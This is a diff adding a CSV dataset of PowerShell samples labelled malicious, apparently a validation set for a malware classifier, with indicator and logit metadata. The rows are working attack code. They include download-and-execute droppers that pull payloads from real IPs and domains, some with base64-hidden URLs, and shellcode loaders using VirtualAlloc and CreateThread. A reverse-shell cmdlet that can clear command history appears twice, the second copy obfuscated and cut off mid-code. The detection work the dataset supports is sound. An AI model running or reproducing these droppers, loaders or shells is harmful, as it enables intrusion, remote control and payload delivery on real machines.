@@ -1,0 +1,681 @@
+seed_id,filename,source_manifest,source_pair_idx,label,primary_indicator,matched_indicators,runtime_target,baseline_predicted_label,baseline_logit_diff,used_char_len,content
+seed_3c8c0468dc0d,fa2y/malicious_samples/a0d2b85a7fd09295b303e9bbb6368d9dbd735cdf05f457e25ff5802f31037001.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,1,malicious,-EncodedCommand,-EncodedCommand,cross_runtime,malicious,6.5,577,"-encodedcommand ""Start-Sleep -Seconds 4;$DragadeTetterworm = (""http://203.96.177.111/555555.dat,http://94.131.101.15/555555.dat,http://87.236.146.236/555555.dat,http://194.165.59.51/555555.dat,http://91.193.19.217/555555.dat,http://94.131.117.45/555555.dat"").split("","");foreach ($Churchgoer in $DragadeTetterworm) {try {wget $Churchgoer -TimeoutSec 19 -O $env:TEMP\ScopophiliacCamphire.manicurist;if ((Get-Item $env:TEMP\ScopophiliacCamphire.manicurist).length -ge 100000) {start rundll32 $env:TEMP\\ScopophiliacCamphire.manicurist,Nikn;break;}}catch {Start-Sleep -Seconds 4;}}"
+seed_76a61933bb51,fa2y/malicious_samples/3be48d4c420c6391f72bfe4c0122f6fbb1d2a0ee0f95dc9e916828ee12540442.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,2,malicious,-EncodedCommand,-EncodedCommand,cross_runtime,malicious,4.8125,710,"Start-Sleep -Seconds 5;$unexculpableArointing = (""https://mrketiando.com.br/mTHv/wgygnMs,https://greyfordacademy1.com/qsf4/02RlCICetdna,https://dcnchurch.info/vS0t89/qrIW8iSL,https://auditoresmenendez.com/HLLMkLW/9RBVe3k7DjFq,https://lascumbres.com.mx/4Xe/BbnTEh7TNt"").split("","");foreach ($wealthful in $unexculpableArointing) {try {wget $wealthful -TimeoutSec 19 -O $env:TEMP\plashed.BrazenfacedlyGlutael;if ((Get-Item $env:TEMP\plashed.BrazenfacedlyGlutael).length -ge 100000) {powershell -encodedcommand ""cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABwAGwAYQBzAGgAZQBkAC4AQgByAGEAegBlAG4AZgBhAGMAZQBkAGwAeQBHAGwAdQB0AGEAZQBsACwAVABpAG0AZQA7AA=="";break;}}catch {Start-Sleep -Seconds 5;}}"
+seed_04ae01372a3c,3321.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,3,malicious,-EncodedCommand,IEX|-EncodedCommand|CreateThread|VirtualAlloc,cross_runtime,malicious,3.875,2527,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}"
+seed_23cf2a8c2f9f,fa2y/malicious_samples/948117c2a6d68251997d49f7cdb833272e79f44093e2efcb9212d49f9d8591a8.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,4,malicious,-EncodedCommand,FromBase64String|-EncodedCommand,cross_runtime,malicious,2.703125,2731,"$urethroplasticWhithersoever = ""aAB0AHQAcABzADoALwAvAGIAdQByAG4AbwB1AHMATQB1AG4AbgBvAHAAcwBpAHMALgBjAG8A"";$moundyExuded = ""Autobiography"";$Hydrospheric = ""aAB0AHQAcABzADoALwAvAHUAbgByAGUAbABhAHgAZQBkAEMAYQB0AG4AYQBjAGgAZQAuAGMAbwBuAHQAcgBhAGMAdABvAHIAcwA="";Start-Sleep -Seconds 13;$AldolasesMegarian = ""aAB0AHQAcABzADoALwAvAG0AeQBjAG8AZwBvAG4AZQBBAHMAcwBpAGcAbgBhAHQAaQBvAG4AcwAuAGMAbwBtAG0AdQBuAGkAdAB5AA==TRaAB0AHQAcABzADoALwAvADEANQA5AC4AMgAyADAALgAyADMANAAuADEANwA1AA==TRaAB0AHQAcABzADoALwAvAGMAcgBvAHMAcwBmAGkAcwBoAC4AdABvAGQAYQB5AA==TRaAB0AHQAcABzADoALwAvAEUAbABhAGIAcgBhAHQAZQAuAGMAYQBzAGgA"";$unmirthful = 33;$choicelessnessGovernesses = ""aAB0AHQAcAA6AC8ALwBUAHkAcABlAGwAZQBzAHMARgB1AHIAYQBuAGUAcwAuAGYAYQByAG0AaeJaAB0AHQAcAA6AC8ALwA2ADcALgAyADEAOQAuADIANQAwAC4AMgAzADAAaeJaAB0AHQAcABzADoALwAvAE8AcgB0AGEAbABpAGQAYQBlAC4AbQBuAA=="";$Muttonhood = ""aAB0AHQAcAA6AC8ALwAxADUAOAAuADIANQA1AC4AMgAxADMALgAxADgAMQAvAG0AaQBSAC8AcABiAFMAegBVAHAAdQBaAHgASgA=naAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADIALgA1ADQALwA5AEcAUQA1AEEAOAAvADUAeQA2AEwARgByAHgASAA=naAB0AHQAcAA6AC8ALwAxADQAOQAuADEANQA0AC4AMQA1ADgALgA5ADEALwBYAG4AZAAvADgAMwByAFIAbgBHAEkAOQA1AHEA"";foreach ($pansinusitisUnpatrolled in $Muttonhood -split ""n"") {$pongidaeThickest = 415;$tantalizerTeutonicism = 443;$largeheartedlyWeighed = ""Obstetrication"";try {$pupillarityInlanders = ""aAB0AHQAcAA6AC8ALwA4ADgALgAyADEAOAAuADEANQAwAC4AMQAwADAAXvVaAB0AHQAcAA6AC8ALwBtAG8AdQB0AGgAZQByAC4AYwBvAGwAbwBnAG4AZQA=XvVaAB0AHQAcAA6AC8ALwBzAGMAaABvAG8AbABtAGUAbgAuAHEAdQBlAGIAZQBjAA==XvVaAB0AHQAcABzADoALwAvADYANwAuADUAMgAuADIAMAAxAC4ANwAyAA=="";$PropensionSorceresses = ""Admonisher"";$ProsthenicCongery = ""grandnephew"";$crackerjack = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pansinusitisUnpatrolled));iwr $crackerjack -O C:\ProgramData\TiderodeReinhabitation.rilingShrews;$wheelwork = ""GemmatingInsulator"";$Heiress = ""PistoladeProjectrix"";if ((Get-Item -Path C:\ProgramData\TiderodeReinhabitation.rilingShrews).Length -ge 109595){powershell -encodedcommand ""cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVABpAGQAZQByAG8AZABlAFIAZQBpAG4AaABhAGIAaQB0AGEAdABpAG8AbgAuAHIAaQBsAGkAbgBnAFMAaAByAGUAdwBzACwARABsAGwAUgBlAGcAaQBzAHQAZQByAFMAZQByAHYAZQByADsAQQBuAGcAdQBsAGEAcgA="";$inhabitednessExpositorially = ""Noncurtailing"";$outrhymed = ""denotePhototelegraphically"";break;Angular;}Angular;} catch {$moolet = ""aAB0AHQAcABzADoALwAvAGMAbwByAHIAdQBwAHQAcgBlAHMAcwBTAHUAYgBzAGkAZABpAHoAZQByAC4AYQBjAHQAbwByAA==dSVgaAB0AHQAcAA6AC8ALwAyADEAMwAuADEAMwAxAC4AMQA2ADgALgA2ADMA"";$PolyspermiaAntipill = 952;}}$prevalency = 517;$DendriticContributions = ""FechnerianDorsoposteriad"";$PotentiatorToxaemic = ""ophichthyoidLichenization"";Angular;"
+seed_c7ebd5a8de5d,3943.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,5,malicious,-EncodedCommand,IEX|-EncodedCommand|CreateThread|VirtualAlloc,cross_runtime,malicious,5.046875,2941,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $i8Wb $vEF $e""}else{;iex ""& powershell $vEF $e"";}"
+seed_3652acdb56d5,fa2y/malicious_samples/1afa55af7c4a24da8651d273202024889d5766637d58a73e93f28afebf013b37.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,11,malicious,-EncodedCommand,Invoke-Expression|-EncodedCommand,cross_runtime,malicious,5.5625,9985,"<#
+.SYNOPSIS
+This cmdlet is for connecting PowerShell to a listening port on a target machine.
+
+
+.DESCRIPTION
+Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.
+
+
+.PARAMETER IpAddress
+This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.
+
+.PARAMETER Port
+This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.
+
+.PARAMETER Reverse
+This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.
+
+.PARAMETER Bind
+This switch paramter sets the Bind parameter set values to be used
+
+.PARAMETER Obfuscate
+This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.
+
+.PARAMETER ClearHistory
+This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
+
+
+.EXAMPLE
+Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.
+
+
+.NOTES
+Author: Robert H. Osborne
+Alias: tobor
+Contact: rosborne@osbornepro.com
+
+
+.LINK
+https://osbornepro.com
+https://writeups.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://github.com/tobor88
+https://gitlab.com/tobor88
+https://www.powershellgallery.com/profiles/tobor
+https://www.linkedin.com/in/roberthosborne/
+https://www.credly.com/users/roberthosborne/badges
+https://www.hackthebox.eu/profile/52286
+
+
+.INPUTS
+None
+
+
+.OUTPUTS
+None
+
+#>
+Function Invoke-ReversePowerShell {
+    [CmdletBinding(DefaultParameterSetName=""Reverse"")]
+        param(
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"")] # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"")] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [IPAddress]$IpAddress,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"")] # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"")] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [ValidateRange(1,65535)]
+            [Int32]$Port = 1337,
+
+            [Parameter(
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Switch]$Reverse,
+
+            [Parameter(
+                ParameterSetName=""Bind"")]  # End Parameter
+            [Switch]$Bind,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Switch][Bool]$Obfuscate,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Alias(""C"",""Cls"",""Ch"",""Clear"")]
+            [Switch][Bool]$ClearHistory
+        ) # End param
+
+
+    Write-Verbose ""Creating a fun infinite loop. - The Shadow King (Amahl Farouk)""
+    $GodsMakeRules = ""They dont follow them""
+
+    While ($GodsMakeRules -eq 'They dont follow them')
+    {
+
+        Write-Verbose ""Default error action is being defined as Continue""
+        $ErrorActionPreference = 'Continue'
+
+        Try
+        {
+
+            Write-Output ""[*] Connection attempted. Check your listener.""
+
+            Switch ($PSCmdlet.ParameterSetName)
+            {
+
+            'Reverse' {
+
+                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+                $Stream = $Client.GetStream()
+
+                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
+                $SendBytes = ([Text.Encoding]::ASCII).GetBytes(""Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME ""+""`n`n"" + ""PS "" + (Get-Location).Path + ""> "")
+                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
+
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+                {
+
+                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
+
+                    If ($Command.StartsWith(""kill-link""))
+                    {
+
+                        If ($ClearHistory.IsPresent)
+                        {
+
+                            Write-Output ""[*] Attempting to clear command history""
+
+                            $CmdHistoryFiles = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt""
+
+                            Clear-History
+                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
+
+Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+                        }  # End If
+
+                        Write-Verbose ""Closing client connection""
+                        $Client.Close()
+                        Write-Verbose ""Client connection closed""
+                        Exit
+
+                    } # End If
+                    Try
+                    {
+
+                        # Executes commands
+                        If ($Obfuscate.IsPresent)
+                        {
+
+                            Write-Verbose ""Obfuscating command""
+
+                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""$Command"")))
+                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
+                            $ExecuteCmdAgain = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End If
+                        Else
+                        {
+
+                            $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
+                            $ExecuteCmdAgain  = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End Else
+
+                    } # End Try
+                    Catch
+                    {
+
+                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
+                        $ExecuteCmdAgain  =  ""ERROR: "" + $Error[0].ToString() + ""`n`n"" + ""PS "" + (Get-Location).Path + ""> ""
+
+                    } # End Catch
+
+                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
+                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                    $Stream.Flush()
+
+                } # End While
+                $Client.Close()
+
+            }  # End Reverse Switch
+
+            'Bind' {
+
+            Write-Warning ""Sorry this is not there yet. I am still figuring this part out""
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Stream = $Client.GetStream()
+
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                $Stream.Flush()
+
+            } # End While
+
+            $Client.Close()
+
+            }  # End Bind Switch
+
+            }  # End Switch
+
+        } # End Try
+        Catch
+        {
+
+            Write-Output ""There was a connection error. Retrying occurs every 30 seconds""
+
+            Write-Verbose ""Client closing...""
+            $Client.Close()
+            Write-Verbose ""Client connection closed""
+
+            Write-Verbose ""Begining countdown timer to reestablish failed connection""
+            [Int]$Timer = 30
+            $Length = $Timer / 100
+
+            For ($Timer; $Timer -gt 0; $Timer--)
+            {
+
+                $Text = ""0:"" + ($Timer % 60) + "" seconds left""
+                Write-Progress -Activity ""Attempting to re-establish connection in: "" -Status $Text -PercentComplete ($Timer / $Length)
+                Start-Sleep -Seconds 1
+
+            }  # End For
+
+        } # End Catch
+
+    } # End While
+    $Client.Close()
+    If ($Listener)
+    {
+
+        $Listener.Stop()
+
+    }  # End If
+
+} # End Function Invoke-ReversePowerShell"
+seed_2ec1a3e97689,fa2y/malicious_samples/1afa55af7c4a24da8651d273202024889d5766637d58a73e93f28afebf013b37-obf-out-obfuscatedast.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,12,malicious,-EncodedCommand,Invoke-Expression|-EncodedCommand,cross_runtime,malicious,5.828125,10106,"<#
+.SYNOPSIS
+This cmdlet is for connecting PowerShell to a listening port on a target machine.
+
+
+.DESCRIPTION
+Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.
+
+
+.PARAMETER IpAddress
+This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.
+
+.PARAMETER Port
+This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.
+
+.PARAMETER Reverse
+This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.
+
+.PARAMETER Bind
+This switch paramter sets the Bind parameter set values to be used
+
+.PARAMETER Obfuscate
+This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.
+
+.PARAMETER ClearHistory
+This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
+
+
+.EXAMPLE
+Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.
+
+
+.NOTES
+Author: Robert H. Osborne
+Alias: tobor
+Contact: rosborne@osbornepro.com
+
+
+.LINK
+https://osbornepro.com
+https://writeups.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://github.com/tobor88
+https://gitlab.com/tobor88
+https://www.powershellgallery.com/profiles/tobor
+https://www.linkedin.com/in/roberthosborne/
+https://www.credly.com/users/roberthosborne/badges
+https://www.hackthebox.eu/profile/52286
+
+
+.INPUTS
+None
+
+
+.OUTPUTS
+None
+
+#>
+Function Invoke-ReversePowerShell {
+    [CmdletBinding(DefaultParameterSetName=""Reverse"")]
+        param(
+            [Parameter(
+                Mandatory=$False,
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [System.Management.Automation.SwitchParameter][System.Boolean]$Obfuscate,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Alias(""Cls"",""C"",""Ch"",""Clear"")]
+            [Switch][Boolean]$ClearHistory,
+
+            [Parameter(
+                Position=0,
+                ParameterSetName=""Reverse"",
+                ValueFromPipelineByPropertyName,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"",
+                ValueFromPipeline,
+                Mandatory)] # End Parameter
+            [Parameter(
+                ValueFromPipelineByPropertyName,
+                Position=0,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"",
+                Mandatory,
+                ParameterSetName=""Bind"",
+                ValueFromPipeline)] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [Net.IPAddress]$IpAddress,
+
+            [Parameter(
+                ParameterSetName=""Bind"")]  # End Parameter
+            [Switch]$Bind,
+
+            [Parameter(
+                Mandatory=$False,
+                ParameterSetName=""Reverse"",
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"",
+                Position=1)] # End Parameter
+            [Parameter(
+                Mandatory=$False,
+                ValueFromPipeline=$False,
+                ParameterSetName=""Bind"",
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"",
+                Position=1)] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [ValidateRange(1,65535)]
+            [Int32]$Port = 1337,
+
+            [Parameter(
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Switch]$Reverse
+        ) # End param
+
+
+    Write-Verbose ""Creating a fun infinite loop. - The Shadow King (Amahl Farouk)""
+    Set-Variable -Name GodsMakeRules -Value (""They dont follow them"")
+
+    While ($GodsMakeRules -eq 'They dont follow them')
+    {
+
+        Write-Verbose ""Default error action is being defined as Continue""
+        Set-Variable -Name ErrorActionPreference -Value ('Continue')
+
+        Try
+        {
+
+            Write-Output ""[*] Connection attempted. Check your listener.""
+
+            Switch ($PSCmdlet.ParameterSetName)
+            {
+
+            'Reverse' {
+
+                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+                $Stream = $Client.GetStream()
+
+                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
+                $SendBytes = ([Text.Encoding]::ASCII).GetBytes(""Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME ""+""`n`n"" + ""PS "" + (Get-Location).Path + ""> "")
